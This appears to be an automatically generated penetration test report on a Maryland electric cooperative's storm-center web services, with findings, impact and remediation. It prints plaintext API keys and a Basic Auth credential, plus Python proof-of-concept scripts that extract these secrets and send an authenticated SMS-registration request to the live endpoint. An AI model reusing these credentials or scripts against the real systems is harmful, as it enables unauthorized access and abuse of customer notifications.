1. **Apply S3 Block Public Access** at the bucket or AWS account level — enable all four settings: `BlockPublicAcls`, `IgnorePublicAcls`, `BlockPublicPolicy`, `RestrictPublicBuckets`.
2. **Remove the public bucket policy** that grants `s3:ListBucket` to `Principal:*`.
3. **If the bucket must serve public content via CloudFront**, use **Origin Access Control (OAC)** so only the CloudFront distribution can read objects — never allow public listing or public read on the bucket itself.
4. **Rotate exposed credentials**: regenerate the WeatherBug and EarthNetworks subscription keys; update the Google Maps API client ID referrer restrictions to limit usage to SMECO domains.
5. **Delete or migrate** the `/logs/` directory (2016 S3 access logs) out of the public bucket.
6. **Remove test/deprecated files** (`defaultSmecoTest.html`, `default_deprecated.html`, `/resources/env_config/{dev,test,local}/`) from the production bucket.

vulnerabilities.title: Exposed Third-Party API Keys in Client-Side JavaScript
vulnerabilities.description: The SMECO Storm Center web application at **stormcenter.smeco.coop** exposes multiple third-party API keys and credentials in publicly accessible client-side JavaScript files. These include a Google Maps Premium client ID, WeatherBug and EarthNetworks subscription keys, a Google Analytics tracking ID, and a hardcoded Basic Auth credential (`awesome:awesome`) for an SMS registration backend endpoint. Any unauthenticated visitor can extract these credentials from the page source, enabling unauthorized usage that could lead to financial abuse of API quotas and service disruption.
vulnerabilities.impact: The exposed API keys and credentials present multiple concrete risks: (1) the Google Maps Premium client ID (`gme-ifactorconsulting1`) could be used by unauthorized third parties to make API calls under SMECO's billing account, incurring direct financial costs and potentially exhausting API quotas — this disrupts the storm center's core mapping functionality for customers during critical weather events; (2) the WeatherBug and EarthNetworks subscription keys could be leveraged to access premium weather data feeds at SMECO's expense; (3) the hardcoded Basic Auth credential (`awesome:awesome`) provides unauthenticated access to the SMS registration SOAP endpoint, enabling an attacker to submit unauthorized SMS messages through the SMECO-branded channel, potentially for phishing, spamming, or social engineering campaigns targeting SMECO customers. All of these impact SMECO's operational security posture and could result in direct financial loss, service degradation, and reputational harm.
vulnerabilities.technicalAnalysis:
The SMECO Storm Center is a single-page application built on the iFactor StormCenter framework (v1.5.0). It relies heavily on client-side JavaScript to integrate third-party mapping, weather, and communication services. The Google Maps JavaScript API v3 is loaded with a Premium Plan client ID (`gme-ifactorconsulting1`) passed directly in the script URL — this authenticates all mapping requests under SMECO's billing account. Similarly, the WeatherBug and EarthNetworks APIs use hardcoded subscription keys passed as query parameters in their respective API calls. The application also embeds a Kubra Chat widget and an outage-reporting module that uses HTTP Basic Authentication with the credential pair `awesome:awesome` (Base64-encoded as `YXdlc29tZTphd2Vzb21l`).

None of these credentials are obfuscated, encrypted, or dynamically fetched from a server-side configuration endpoint. They are all statically embedded in JavaScript files that are served publicly without authentication. This is a common architectural anti-pattern in client-rendered SPAs that integrate third-party APIs without a backend proxy layer.

CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is the most specific classification — the application exposes credential information that should remain confidential to an audience that lacks authorization to view it.
vulnerabilities.pocDescription:
1. Navigate to `https://stormcenter.smeco.coop/external/default.html` in any browser.
2. Open developer tools and view the page source or inspect the JavaScript files loaded by the page.
3. Search for `client=gme-` to locate the Google Maps Premium client ID.
4. Search for `bb2dbf47` to locate the WeatherBug subscription key.
5. Search for `aa16cb2a` to locate the EarthNetworks subscription key.
6. Search for `YXdlc29tZTphd2Vzb21l` to locate the hardcoded Basic Auth credential.
7. All values are present in plaintext — no authentication, obfuscation, or restriction required.

```python
import requests
import re

url = "https://stormcenter.smeco.coop/external/default.html"
resp = requests.get(url, timeout=15)
html = resp.text

# Extract script URLs
script_urls = re.findall(r'<script[^>]+src="([^"]+)"', html)
print(f"Found {len(script_urls)} script references")

# Check for keys across all scripts
secrets_found = []
for src in script_urls:
    if src.startswith("//"):
        src = "https:" + src
    elif src.startswith("/"):
        src = "https://stormcenter.smeco.coop" + src
    try:
        js = requests.get(src, timeout=10).text
        for pattern, name in [
            (r"client=gme-[a-z0-9]+", "Google Maps Client ID"),
            (r"bb2dbf47[0-9a-f]+", "WeatherBug Key"),
            (r"aa16cb2a[0-9a-f]+", "EarthNetworks Key"),
            (r"YXdlc29tZTphd2Vzb21l", "Basic Auth (awesome:awesome)"),
        ]:
            matches = re.findall(pattern, js, re.I)
            for m in matches:
                secrets_found.append(f"{name}: {m}")
                print(f"[FOUND] {name}: {m}")
    except Exception as e:
        print(f"  [SKIP] {src}: {e}")

if not secrets_found:
    print("No secrets found (may need to fetch assets differently)")
else:
    print(f"\nTotal secrets extracted: {len(secrets_found)}")
```

vulnerabilities.remediation:
1. **Remove all hardcoded API keys and client IDs from client-side JavaScript.** These credentials must never be embedded in code delivered to the browser.
2. **Proxy third-party API calls through a server-side endpoint.** Implement a backend proxy that the client calls, and the server appends the API key before forwarding to the third-party service. This keeps keys server-side and out of the browser.
3. **Rotate all exposed credentials immediately.** Generate new client IDs, subscription keys, and API secrets, and deploy the replacements server-side only. The current credentials should be invalidated to prevent continued unauthorized use.
4. **Apply referrer and domain restrictions.** For each third-party API (Google Maps, WeatherBug, EarthNetworks), configure the provider dashboard to restrict key usage to the `smeco.coop` domain only, so that requests from other origins are rejected.
5. **Remove or obfuscate the hardcoded Basic Auth credential** for the SMS registration SOAP endpoint. Implement proper server-side authentication with unique per-session tokens instead of static credentials exposed in client code.
6. **Audit all client-side JavaScript files** for any additional embedded secrets, including internal hostnames, API paths, or authentication tokens that should not be publicly accessible.

reportMarkdown:
# Security Penetration Test Report

**Generated:** 2026-08-19 10:51:02 UTC

# Executive Summary

# Executive Summary

An external security assessment of **SMECO (Southern Maryland Electric Cooperative)** web infrastructure identified **4 confirmed vulnerabilities** affecting the organization's public-facing web applications.

## Overall Risk Posture: Elevated

SMECO's outage management infrastructure, built on the iFactor/Kubra platform, has several security weaknesses that expose internal configuration details, API credentials, and customer notification systems to unauthorized parties.

## Key Findings

- **Publicly Listable S3 Bucket (High)** — The `stormcenter.smeco.coop` S3 bucket permits unauthenticated listing of all 1000+ objects, exposing environment configuration files, API keys, JavaScript source code, historical outage data, and S3 access logs from 2016.

- **Hardcoded Basic Auth Credential (Medium)** — Plaintext credentials (`awesome:awesome`) are embedded in client-side JavaScript, granting unauthorized access to the SMS notification registration SOAP endpoint.

- **Exposed Third-Party API Keys (Medium)** — Google Maps Premium client ID, WeatherBug, and EarthNetworks subscription keys are exposed in publicly accessible JavaScript files.

- **DOM-Based Cross-Site Scripting (Medium)** — The `language` URL parameter on the storm center page is injected directly into `innerHTML` without sanitization, enabling script execution under specific conditions.

## Business Impact

- **Data Exposure**: The S3 bucket exposes infrastructure configuration, historical outage data, and internal URLs that could facilitate further attacks.
- **Service Abuse**: The hardcoded credential enables unauthorized SMS notification enrollment for any SMECO account.
- **Financial Risk**: Exposed third-party API keys could be abused for unauthorized usage, resulting in unexpected charges.
- **Customer Trust**: The XSS vulnerability could be leveraged to manipulate the storm center page viewed by customers during outages.

# Methodology

# Methodology

This assessment was conducted as a **black-box external test** per the **OWASP Web Security Testing Guide (WSTG)** methodology.

## Scope

- **Primary Target**: `https://www.smeco.coop/` (unreachable from test environment)
- **Extended Scope**: All subdomains of `smeco.coop` discovered during reconnaissance
- **Approach**: Black-box (no source code or credentials provided)

## Activities Performed

1. **Reconnaissance & Asset Discovery**: Subdomain enumeration via Subfinder, DNS resolution, technology fingerprinting via HTTP probing
2. **Attack Surface Mapping**: Web crawling via Katana and browser-based exploration, directory/file discovery via FFUF, S3 bucket enumeration
3. **Vulnerability Discovery**: Automated scanning via Nuclei, manual browser-based analysis, parameter fuzzing, HTTP method testing
4. **Validation**: Each finding was independently validated with proof-of-concept testing
5. **Reporting**: Findings documented with CVSS scoring, CWE references, and remediation guidance

# Technical Analysis

# Technical Analysis

## Severity Model

Severity is assessed per CVSS 3.1, reflecting exploitability and demonstrated impact. All findings are dynamically validated (PoC-backed).

## Confirmed Findings

### 1. Publicly Listable S3 Bucket (High — CVSS 7.5)

**Report ID**: `vuln-0002`

The S3 bucket `stormcenter.smeco.coop` (us-east-1, served via CloudFront `dgph24zgttq5f.cloudfront.net`) permits unauthenticated `s3:ListBucket` and `s3:GetObject` operations. This allows any internet user to enumerate the full bucket contents — over 1000 objects including:

- **Environment configuration files**: `env.json` (reveals environment: `prod`), `version.json` (reveals version `1.5.0`, revision `1c99896`)
- **JavaScript source code**: Full application source with embedded API keys and internal URLs
- **Historical outage data**: Interval generation data spanning 2016-2024
- **S3 access logs**: Server access logs from March 2016
- **Environment configs for dev/test/local**: Exposed at `/resources/env_config/`

### 2. Hardcoded Basic Auth Credential (Medium — CVSS 6.5)

**Report ID**: `vuln-0001`

The outage reporting JavaScript at `smeco31.ifactornotifi.com/ui/scripts/outage-reporting/outage.js` contains hardcoded Basic Authentication credentials (`awesome:awesome`, Base64: `YXdlc29tZTphd2Vzb21l`) on line 925 (active) and line 685 (commented out). The credential authenticates SOAP requests to `POST /sl/smeco/http/v4/profile` for SMS outage notification registration. Validation confirmed the server accepts requests with this credential while rejecting invalid credentials with HTTP 401.

### 3. Exposed Third-Party API Keys (Medium — CVSS 5.3)

**Report ID**: `vuln-0003`

Multiple API keys are exposed in plaintext within the Storm Center application's JavaScript:

- **Google Maps Premium Client ID**: `gme-ifactorconsulting1` (also `gme-skywiresoftware` in internal version)
- **WeatherBug Subscription Key**: `bb2dbf477236476e98701b4f482a177f`
- **EarthNetworks Subscription Key**: `aa16cb2acb46482489180b7da336872d`
- **Google Analytics IDs**: UA-6833158-53 (prod), UA-6833158-64 (test), G-CCX8YHBDDH (GA4)

### 4. DOM-Based Cross-Site Scripting (Medium — CVSS 4.2)

**Report ID**: `vuln-0004`

The Storm Center application at `stormcenter.smeco.coop/external/default.html` reads the `language` URL parameter and assigns it directly to `element.innerHTML` without sanitization:

```javascript
iFactor.getUrlArgument("language") && document.getElementById("scLanguage") &&
    (document.getElementById("scLanguage").innerHTML = iFactor.getUrlArgument("language"));
```

The `iFactor.getUrlArgument` function parses query parameters with a custom parser that only decodes `%20` (spaces). While modern browsers auto-encode `<` and `>` in `location.search`, the vulnerability is exploitable through server-side redirects, older browsers, mobile WebViews, and non-web link handlers.

## Systemic Themes

- **Configuration Drift**: The 502 subdomains (chat, accountmanager, testaccountmanager, iowa, outage) have DNS records pointing to services that no longer accept connections, suggesting incomplete decommissioning processes.
- **Defense in Depth**: The S3 bucket lacks `BlockPublicAccess` settings, and client-side code contains secrets that should be managed server-side.
- **Aging Infrastructure**: Apache Tomcat 7.0.76 (EOL 2018) and outdated jQuery versions (1.7.2, 1.10.2) indicate a need for dependency lifecycle management.

# Recommendations

# Recommendations

## Immediate (Address within 1-2 weeks)

1. **Disable S3 Public Listing** — Configure `BlockPublicAccess` on the `stormcenter.smeco.coop` S3 bucket. Restrict bucket policies to only allow CloudFront `origin-access-identity` to read objects. Verify the fix by attempting to list the bucket anonymously.

2. **Rotate Exposed Credentials** — Immediately rotate all exposed API keys:
   - Google Maps Premium client ID (`gme-ifactorconsulting1`)
   - WeatherBug subscription key (`bb2dbf477236476e98701b4f482a177f`)
   - EarthNetworks subscription key (`aa16cb2acb46482489180b7da336872d`)
   - Basic Auth credential (`awesome:awesome`) used for SMS registration

3. **Remove Hardcoded Credentials from Client-Side Code** — Replace the static Basic Auth header with server-side session-based authentication. The SOAP endpoint should require per-session tokens rather than shared static credentials in JavaScript.

4. **Fix DOM XSS** — Replace `innerHTML` with `textContent` for the `#scLanguage` element update in the storm center application. This is a one-line change in `external/default.html`.

## Short-Term (Within 1 month)

5. **Implement Server-Side API Proxy** — Route all third-party API calls (Google Maps, WeatherBug, EarthNetworks) through a server-side proxy so API keys never reach the browser. Apply domain/referrer restrictions on the provider side.

6. **Update Outdated Dependencies** — Upgrade jQuery, Moment.js, and jQuery UI to current versions. If the iFactor platform controls these, coordinate with the vendor for a platform update.

7. **Remove Unused Subdomains** — Audit and decommission the 502-returning subdomains (chat, accountmanager, testaccountmanager, iowa, outage) and the 404-returning subdomains (stories, stormcentertest). Remove associated DNS records and S3 buckets.

## Medium-Term (Within 3 months)

9. **Establish Dependency Lifecycle Management** — Implement automated dependency scanning in the CI/CD pipeline to detect and flag EOL libraries and frameworks.

11. **Conduct Internal Security Review** — Review the iFactor/Kubra platform configuration for additional security settings, including authentication requirements and access controls.

shortDescription.text: Publicly Listable S3 Bucket Exposes Application Configuration and Infrastructure Details

fullDescription.text: The S3 bucket backing **stormcenter.smeco.coop** (`stormcenter.smeco.coop` bucket, `us-east-1`, served via CloudFront `dgph24zgttq5f.cloudfront.net`) permits unauthenticated listing of all objects. Any internet user can enumerate the full contents of the bucket — 1000+ objects spanning environment configurations, client-side JavaScript source with embedded API keys, historical outage data (2016-2024), 2016-era S3 access logs, and internal/development application files.

help.text:
The S3 bucket backing **stormcenter.smeco.coop** (`stormcenter.smeco.coop` bucket, `us-east-1`, served via CloudFront `dgph24zgttq5f.cloudfront.net`) permits unauthenticated listing of all objects. Any internet user can enumerate the full contents of the bucket — 1000+ objects spanning environment configurations, client-side JavaScript source with embedded API keys, historical outage data (2016-2024), 2016-era S3 access logs, and internal/development application files.

An attacker with no authentication can enumerate all 1000+ objects in the bucket, gaining full visibility into the application's architecture, internal paths, environment configurations, and client-side source code. The exposure includes:

- **API keys** for Google Maps, WeatherBug, and EarthNetworks that could be used off-domain for service abuse or incurring costs.
- **Internal infrastructure URLs** (e.g., the iFactor outage-reporting backend at `smeco31.ifactornotifi.com` and its test counterpart), facilitating targeted attacks on the internal API.
- **Historical S3 access logs** from 2016, which may contain request patterns, IP addresses, and referrer information from legitimate users.
- **12 years of outage data** (2016-2024) exposing operational patterns and historical infrastructure state.
- **Internal and dev/test application versions**, revealing staging and development infrastructure.

While the exposed API keys are client-side (intended for browser usage), the referrer-unrestricted bucket listing makes it trivial for anyone to exfiltrate the entire application surface, config, and historical operational data.

1. **Apply S3 Block Public Access** at the bucket or AWS account level — enable all four settings: `BlockPublicAcls`, `IgnorePublicAcls`, `BlockPublicPolicy`, `RestrictPublicBuckets`.
2. **Remove the public bucket policy** that grants `s3:ListBucket` to `Principal:*`.
3. **If the bucket must serve public content via CloudFront**, use **Origin Access Control (OAC)** so only the CloudFront distribution can read objects — never allow public listing or public read on the bucket itself.
4. **Rotate exposed credentials**: regenerate the WeatherBug and EarthNetworks subscription keys; update the Google Maps API client ID referrer restrictions to limit usage to SMECO domains.
5. **Delete or migrate** the `/logs/` directory (2016 S3 access logs) out of the public bucket.
6. **Remove test/deprecated files** (`defaultSmecoTest.html`, `default_deprecated.html`, `/resources/env_config/{dev,test,local}/`) from the production bucket.

rules.name: DOM-Based Cross-Site Scripting via language Parameter in Storm Center Application

shortDescription.text: DOM-Based Cross-Site Scripting via language Parameter in Storm Center Application

fullDescription.text: The Storm Center outage map application at `stormcenter.smeco.coop` contains a DOM-based Cross-Site Scripting (XSS) vulnerability in the `language` URL parameter. The parameter value is read from the query string and directly assigned to `element.innerHTML` without any sanitization or encoding. When the payload reaches the sink through channels that bypass modern browser URL encoding (server-side redirects, older browsers, WebViews, non-web contexts), an attacker can inject arbitrary HTML and JavaScript into the page.

help.text:
The Storm Center outage map application at `stormcenter.smeco.coop` contains a DOM-based Cross-Site Scripting (XSS) vulnerability in the `language` URL parameter. The parameter value is read from the query string and directly assigned to `element.innerHTML` without any sanitization or encoding. When the payload reaches the sink through channels that bypass modern browser URL encoding (server-side redirects, older browsers, WebViews, non-web contexts), an attacker can inject arbitrary HTML and JavaScript into the page.

An attacker who can deliver a crafted link through a server-side redirect, older browser, mobile WebView, or non-web context (email/SMS) can execute arbitrary JavaScript in the context of the Storm Center outage map application. This enables session cookie theft, page content manipulation, phishing overlays, redirection to malicious sites, and unauthorized actions performed on behalf of the victim. The language value is also propagated to `iFactor.scLanguage` for message lookup, potentially expanding the reach of injected content within the application.

1. **Replace `innerHTML` with `textContent`** — Change the vulnerable line in `external/default.html` from `innerHTML` assignment to `textContent` assignment. Since the `#scLanguage` element is used to display a language code label (e.g., "EN-US", "ES-ES"), plain text is the semantically correct content type. This single change prevents any HTML or JavaScript interpretation:
   ```javascript
   document.getElementById("scLanguage").textContent = iFactor.getUrlArgument("language");
   ```

2. **Use `decodeURIComponent` in the URL parser** — Update the custom `iFactor.getUrlArguments` function in `stormcenter_start_merged.js` to use `decodeURIComponent()` instead of manually replacing only `%20`. This ensures all URL-encoded special characters are handled correctly:
   ```javascript
   a[d[0].replace(/%20/g, " ").replace(/^\s+|\s+$/g, "").toLowerCase()] =
       decodeURIComponent(d[1].replace(/^\s+|\s+$/g, ""));
   ```

3. **Input validation** — Apply a server-side or client-side allowlist for the `language` parameter that only accepts known language codes (e.g., `/^(EN-US|ES-ES|FR-FR)$/i`), rejecting any unexpected input before it reaches the DOM.

strix.technical_analysis:
The hardcoded credential was discovered in the outage reporting JavaScript at `https://smeco31.ifactornotifi.com/ui/scripts/outage-reporting/outage.js` on two separate lines:

{

  "Principal": "*",
  "Action": "s3:ListBucket",

Because `s3:GetObject` also appears to be publicly permitted on at least a subset of objects, any enumerated key can be retrieved directly over HTTP, including configuration files, JavaScript source, historical data, and access logs. message.text:
Exposed Third-Party API Keys in Client-Side JavaScript

The SMECO Storm Center web application at **stormcenter.smeco.coop** exposes multiple third-party API keys and credentials in publicly accessible client-side JavaScript files. These include a Google Maps Premium client ID, WeatherBug and EarthNetworks subscription keys, a Google Analytics tracking ID, and a hardcoded Basic Auth credential (`awesome:awesome`) for an SMS registration backend endpoint. Any unauthenticated visitor can extract these credentials from the page source, enabling unauthorized usage that could lead to financial abuse of API quotas and service disruption.

strix.impact: The exposed API keys and credentials present multiple concrete risks: (1) the Google Maps Premium client ID (`gme-ifactorconsulting1`) could be used by unauthorized third parties to make API calls under SMECO's billing account, incurring direct financial costs and potentially exhausting API quotas — this disrupts the storm center's core mapping functionality for customers during critical weather events; (2) the WeatherBug and EarthNetworks subscription keys could be leveraged to access premium weather data feeds at SMECO's expense; (3) the hardcoded Basic Auth credential (`awesome:awesome`) provides unauthenticated access to the SMS registration SOAP endpoint, enabling an attacker to submit unauthorized SMS messages through the SMECO-branded channel, potentially for phishing, spamming, or social engineering campaigns targeting SMECO customers. All of these impact SMECO's operational security posture and could result in direct financial loss, service degradation, and reputational harm.
strix.technical_analysis:
The SMECO Storm Center is a single-page application built on the iFactor StormCenter framework (v1.5.0). It relies heavily on client-side JavaScript to integrate third-party mapping, weather, and communication services. The Google Maps JavaScript API v3 is loaded with a Premium Plan client ID (`gme-ifactorconsulting1`) passed directly in the script URL — this authenticates all mapping requests under SMECO's billing account. Similarly, the WeatherBug and EarthNetworks APIs use hardcoded subscription keys passed as query parameters in their respective API calls. The application also embeds a Kubra Chat widget and an outage-reporting module that uses HTTP Basic Authentication with the credential pair `awesome:awesome` (Base64-encoded as `YXdlc29tZTphd2Vzb21l`).

None of these credentials are obfuscated, encrypted, or dynamically fetched from a server-side configuration endpoint. They are all statically embedded in JavaScript files that are served publicly without authentication. This is a common architectural anti-pattern in client-rendered SPAs that integrate third-party APIs without a backend proxy layer.

CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is the most specific classification — the application exposes credential information that should remain confidential to an audience that lacks authorization to view it.
strix.remediation_steps:
1. **Remove all hardcoded API keys and client IDs from client-side JavaScript.** These credentials must never be embedded in code delivered to the browser.
2. **Proxy third-party API calls through a server-side endpoint.** Implement a backend proxy that the client calls, and the server appends the API key before forwarding to the third-party service. This keeps keys server-side and out of the browser.
3. **Rotate all exposed credentials immediately.** Generate new client IDs, subscription keys, and API secrets, and deploy the replacements server-side only. The current credentials should be invalidated to prevent continued unauthorized use.
4. **Apply referrer and domain restrictions.** For each third-party API (Google Maps, WeatherBug, EarthNetworks), configure the provider dashboard to restrict key usage to the `smeco.coop` domain only, so that requests from other origins are rejected.
5. **Remove or obfuscate the hardcoded Basic Auth credential** for the SMS registration SOAP endpoint. Implement proper server-side authentication with unique per-session tokens instead of static credentials exposed in client code.
6. **Audit all client-side JavaScript files** for any additional embedded secrets, including internal hostnames, API paths, or authentication tokens that should not be publicly accessible.

poc.description:
1. Navigate to `https://stormcenter.smeco.coop/external/default.html` in any browser.
2. Open developer tools and view the page source or inspect the JavaScript files loaded by the page.
3. Search for `client=gme-` to locate the Google Maps Premium client ID.
4. Search for `bb2dbf47` to locate the WeatherBug subscription key.
5. Search for `aa16cb2a` to locate the EarthNetworks subscription key.
6. Search for `YXdlc29tZTphd2Vzb21l` to locate the hardcoded Basic Auth credential.
7. All values are present in plaintext — no authentication, obfuscation, or restriction required.

strix.impact: An attacker who can deliver a crafted link through a server-side redirect, older browser, mobile WebView, or non-web context (email/SMS) can execute arbitrary JavaScript in the context of the Storm Center outage map application. This enables session cookie theft, page content manipulation, phishing overlays, redirection to malicious sites, and unauthorized actions performed on behalf of the victim. The language value is also propagated to `iFactor.scLanguage` for message lookup, potentially expanding the reach of injected content within the application.
strix.technical_analysis:
**Root Cause**

The Storm Center outage map application reads the `language` URL query parameter using a custom parser (`iFactor.getUrlArguments`) and assigns it directly to `innerHTML`:

```javascript title=external/default.html
iFactor.getUrlArgument("language") && document.getElementById("scLanguage") &&
    (document.getElementById("scLanguage").innerHTML = iFactor.getUrlArgument("language"));
```

`innerHTML` is a well-known DOM XSS sink. When the assigned string contains HTML markup, the browser parses it and creates corresponding DOM elements. If the markup includes event handlers (e.g., `onerror`, `onload`), those handlers execute in the security context of the page.

**Encoding Bypass Channels**

The custom URL parser in `stormcenter_start_merged.js` only decodes `%20` (spaces), leaving other percent-encoded characters intact:

```javascript
d[1].replace(/%20/g, " ").replace(/^\s+|\s+$/g, "");
```

Modern browsers automatically encode `<` and `>` as `%3C` and `%3E` in `window.location.search`, which prevents direct exploitation through a normal browser navigation. However, the vulnerability is exploitable through:

- **Server-side redirects** — A 301/302 redirect can deliver an unencoded query string to the browser, bypassing the URL bar encoding protections.
- **Legacy/older browsers** — Internet Explorer 11, old Safari, and old Chrome versions may not encode special characters in `location.search`.
- **Mobile WebViews** — In-app browsers (WebViews) often pass query parameters without encoding.
- **Non-web link handlers** — Email clients, SMS apps, and messaging applications may open URLs without encoding query strings.
- **Browser extensions** — Extensions using the `webRequest` API can manipulate query strings before navigation.

**Propagation Beyond the Sink**

After the `innerHTML` assignment, the language value is also propagated:

```javascript
iFactor.scLanguage = iFactor.getUrlArgument("language") ||
                     document.getElementById("scLanguage").innerHTML;
```

This means injected content may be consumed by other parts of the application for message lookup and display, potentially widening the blast radius of the injected content.
strix.remediation_steps:
1. **Replace `innerHTML` with `textContent`** — Change the vulnerable line in `external/default.html` from `innerHTML` assignment to `textContent` assignment. Since the `#scLanguage` element is used to display a language code label (e.g., "EN-US", "ES-ES"), plain text is the semantically correct content type. This single change prevents any HTML or JavaScript interpretation:
   ```javascript
   document.getElementById("scLanguage").textContent = iFactor.getUrlArgument("language");
   ```

2. **Use `decodeURIComponent` in the URL parser** — Update the custom `iFactor.getUrlArguments` function in `stormcenter_start_merged.js` to use `decodeURIComponent()` instead of manually replacing only `%20`. This ensures all URL-encoded special characters are handled correctly:
   ```javascript
   a[d[0].replace(/%20/g, " ").replace(/^\s+|\s+$/g, "").toLowerCase()] =
       decodeURIComponent(d[1].replace(/^\s+|\s+$/g, ""));
   ```

3. **Input validation** — Apply a server-side or client-side allowlist for the `language` parameter that only accepts known language codes (e.g., `/^(EN-US|ES-ES|FR-FR)$/i`), rejecting any unexpected input before it reaches the DOM.

vulnerabilitiesJson.title: Hardcoded Basic Auth Credential in SMECO Outage Reporting JavaScript
vulnerabilitiesJson.description: The SMECO outage reporting portal at `smeco31.ifactornotifi.com` exposes hardcoded Basic Authentication credentials (`awesome:awesome`, Base64 `YXdlc29tZTphd2Vzb21l`) in client-side JavaScript code. The credential is used to authenticate SOAP requests to the SMS notification registration endpoint. Since it is embedded in publicly-accessible JavaScript, any user of the outage reporting page can extract and reuse it to register arbitrary phone numbers for SMS outage notifications without authorization.
vulnerabilitiesJson.impact: An attacker can leverage the publicly-exposed credential to register arbitrary phone numbers for SMS outage notifications on any SMECO account. This enables unauthorized enrollment of third-party phone numbers into SMECO's notification system, potential account probing (determining which account numbers exist), and abuse of the SMS notification platform for spam or social engineering. The credential is also present in code as a commented-out header on a secondary endpoint (`confirmAccount`), indicating broader potential reuse across the application's API surface.
vulnerabilitiesJson.technical_analysis:
The hardcoded credential was discovered in the outage reporting JavaScript at `https://smeco31.ifactornotifi.com/ui/scripts/outage-reporting/outage.js` on two separate lines:

**Line 925 (active):**
```javascript
xhr.setRequestHeader ("Authorization", "Basic YXdlc29tZTphd2Vzb21l");
```
This is used in the `smsReg()` function, which sends a SOAP `prof:register` request to `POST /sl/smeco/http/v4/profile` with the namespace `http://notifi.ifactorconsulting.com/soap/v4/profile`. The endpoint registers a phone number (SMS channel) to receive outage notifications for a given SMECO account number.

**Line 685 (commented out):**
```javascript
//xhr.setRequestHeader ("Authorization", "Basic YXdlc29tZTphd2Vzb21l");
```
This was intended for the `confirmAccount()` endpoint but is currently commented out, suggesting the credential was designed for broader use.

Validation confirmed:
- **Correct auth**: Server processes the SOAP request (HTTP 500 with business logic error "Failed to add a contact" due to test data, not auth failure)
- **Wrong auth** (`wrong:wrong`): HTTP 401 Unauthorized
- The server enforces the Basic Auth and processes authenticated requests to the backend service

The SOAP server is hosted on AWS EC2 (52.70.98.1, us-east-1, alias `smeco-prod-02.ifactornotifi.com`).
vulnerabilitiesJson.poc_description:
1. Fetch the outage reporting JavaScript: `GET https://smeco31.ifactornotifi.com/ui/scripts/outage-reporting/outage.js`
2. Search for `YXdlc29tZTphd2Vzb21l` to locate the hardcoded Base64 credential
3. Decode the Base64 value to `awesome:awesome`
4. Send a SOAP request to the profile endpoint with the credential:
   - Endpoint: `POST https://smeco31.ifactornotifi.com/sl/smeco/http/v4/profile`
   - Header: `Authorization: Basic YXdlc29tZTphd2Vzb21l`
   - Content-Type: `text/xml; charset=utf-8`
   - Body: A SOAP envelope with the `prof:register` method, an account number, and a phone number
5. Observe that the server processes the request (returns a SOAP envelope response), while wrong credentials return HTTP 401
vulnerabilitiesJson.poc_script_code:
import requests
import base64

# Credential extracted from outage.js
credential = base64.b64decode("YXdlc29tZTphd2Vzb21l").decode()
print(f"[*] Extracted credential: {credential}")

# SOAP endpoint
url = "https://smeco31.ifactornotifi.com/sl/smeco/http/v4/profile"
headers = {
    "Authorization": "Basic YXdlc29tZTphd2Vzb21l",
    "Content-Type": "text/xml; charset=utf-8"
}

# Minimal SOAP envelope
xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:prof="http://notifi.ifactorconsulting.com/soap/v4/profile">
<soapenv:Header/>
<soapenv:Body>
<prof:register>
<accountIdentifier number="1008968"/>
<contactIdentifier value="5551234567" channel="SMS"/>
<enrollDefaultPrograms>true</enrollDefaultPrograms>
<preference>
<nickname>en-us</nickname>
</preference>
</prof:register>
</soapenv:Body>
</soapenv:Envelope>"""

resp = requests.post(url, headers=headers, data=xml_payload, timeout=15)
print(f"[*] Valid auth response: HTTP {resp.status_code}")
print(f"[*] Body: {resp.text[:200]}")

# Verify wrong auth is rejected
wrong_headers = {"Authorization": "Basic d3Jvbmc6d3Jvbmc="}
resp2 = requests.post(url, headers=wrong_headers, data=xml_payload, timeout=15)
print(f"[*] Wrong auth response: HTTP {resp2.status_code}")
vulnerabilitiesJson.remediation_steps:
1. Remove the hardcoded credentials from the client-side JavaScript code immediately
2. Implement proper server-side authentication using a secure, non-discoverable mechanism (e.g., session-based tokens, OAuth2)
3. Rotate the current credentials on the backend to invalidate the exposed `awesome:awesome` credential
4. Implement rate limiting and monitoring on the SOAP endpoint to detect and prevent abuse
5. Change the authentication model so that SMS registration is tied to the authenticated user's session rather than relying on shared static credentials in client-side code
6. Review the commented-out credential on line 685 and ensure no other endpoints still depend on it
